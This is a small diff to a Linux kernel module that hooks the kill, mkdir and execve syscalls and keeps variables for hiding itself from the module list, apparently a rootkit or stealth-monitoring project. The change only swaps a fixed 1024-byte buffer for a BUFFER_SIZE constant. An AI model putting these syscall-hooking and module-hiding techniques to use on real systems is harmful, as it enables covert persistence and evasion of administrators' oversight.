@@ -1,6 +1,7 @@
 	/*=========================================*\
 		generic functions to be used by hooks
 	\*=========================================*/
+
 bool module_hidden = false; //variable to see if the module is hidden
 static struct list_head *prev_module; //location of the previous module
 
@@ -42,7 +43,7 @@ ptregs_t orig_kill = (ptregs_t) 0; //address of the kill syscall from the syscal
 
 
 static asmlinkage long hooked_kill(const struct pt_regs *regs){ //hook function
-	char buffer[1024]; //buffer for sprintf
+	char buffer[BUFFER_SIZE]; //buffer for sprintf
 	int pid = regs->di; //gets ID of process to be killed from pt_regs structure
 	int sig = regs->si; //gets signal from pt_regs structure
 	if (sig<10||sig==19||sig==18||sig==30){ //if kill signal is interesting signal
@@ -59,7 +60,7 @@ struct hook_t sys_kill = {.hooked_syscall = hooked_kill, .syscall_number = __NR_
 	\*================*/
 ptregs_t orig_mkdir = (ptregs_t) 0; //address of the mkdir syscall from the syscall table
 static asmlinkage long hooked_mkdir(const struct pt_regs *regs){ //hook function
-	char buffer[1024]; //buffer for sprintf
+	char buffer[BUFFER_SIZE]; //buffer for sprintf
 	char dir_name[NAME_MAX] = {0}; //buffer for directory name
 	char __user *pathname = (char *)regs->di; //gets userspace pathname
 	int mode = (int)regs->si; //gets mkdir mode
@@ -82,7 +83,7 @@ struct hook_t sys_mkdir = {.hooked_syscall = hooked_mkdir, .syscall_number = __N
 	\*====================*/
 ptregs_t orig_execve = (ptregs_t) 0; //address of the execve syscall from the syscall table
 static asmlinkage long hooked_execve(const struct pt_regs *regs){ //hook functions
-	char buffer[1024]; //buffer for sprintf
+	char buffer[BUFFER_SIZE]; //buffer for sprintf
 	char filename[NAME_MAX] = {0}; //buffer for filename
 	char __user *filename_user = (char *)regs->di; //gets userspace filename
 
